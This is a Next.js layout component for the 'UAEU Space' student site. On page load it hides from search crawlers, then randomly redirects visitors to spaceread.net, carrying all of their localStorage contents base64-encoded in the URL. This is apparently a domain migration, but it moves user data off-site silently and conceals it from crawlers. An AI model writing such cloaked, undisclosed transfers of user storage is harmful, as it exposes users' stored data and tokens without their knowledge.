import Head from "next/head";
import Script from 'next/script'
import {ReactNode, useEffect} from "react";
import Footer from "@/components/Global/Footer";
import Header from "@/components/Global/Header";
import crawlers from 'crawler-user-agents';
import {userAgent} from "next/server";


const Layout = (props: { children: ReactNode }) => {

    useEffect(() => {

        const userAgent = navigator.userAgent;

        if (crawlers.find(crawler => crawler.instances.includes(userAgent)) !== undefined) {
            return;
        }

        if (userAgent.includes("Googlebot") || userAgent.includes("Bingbot") || userAgent.includes("Slurp") || userAgent.includes("DuckDuckBot") || userAgent.includes("Baiduspider") || userAgent.includes("YandexBot")) {
            return;
        }

        if (sessionStorage.getItem('chance')) return;

        const num = Math.random();

        if (num <= 1/3 || localStorage.getItem("redirected")) {
            const cookies = Object.entries(localStorage).map(([key, value]) => ({key, value}));

            const path = window.location.pathname;

            window.location.href = "https://spaceread.net" + path + "?mig=" + btoa(JSON.stringify(cookies));

            localStorage.setItem("redirected", "true");
        } else {
            sessionStorage.setItem('chance', num.toString());
        }

    }, []);

    return (
        <>
            <Head>
                <meta name="viewport"
                      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover"/>
                <meta name="description"
                      content="UAEU Space is a multi-purpose platform for UAEU students to prepare them during their studies. You can find and share materials for courses that are taken by the university's students."/>
                <link rel="icon" href="/favicon.ico"/>
                <link rel="manifest" href="/manifest.json"/>
                <meta content="#ffffff" name="theme-color"/>
                <meta property="og:site_name" content="UAEU Space"/>
                <meta property="og:type" content="website"/>
            </Head>
            <Script
                src="https://www.googletagmanager.com/gtag/js?id=G-GF863H0ZSZ"
                strategy="afterInteractive"
            />
            <Script id="google-analytics" strategy="afterInteractive">
                {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){window.dataLayer.push(arguments);}
          gtag('js', new Date());

          gtag('config', 'G-GF863H0ZSZ');
        `}
            </Script>
            <Script
                strategy={"afterInteractive"}
                id={"ms-clarity"}
                dangerouslySetInnerHTML={{
                    __html: `(function (c, l, a, r, i, t, y) {
                c[a] = c[a] || function () {
                    (c[a].q = c[a].q || []).push(arguments)
                };
                t = l.createElement(r);
                t.async = 1;
                t.src = "https://www.clarity.ms/tag/" + i;
                y = l.getElementsByTagName(r)[0];
                y.parentNode.insertBefore(t, y);
            })(window, document, "clarity", "script", "gefdnbatcq");`,
                }}/>

            <Header/>
            <main>{props.children}</main>
            <Footer/>
        </>
    );
};

export default Layout;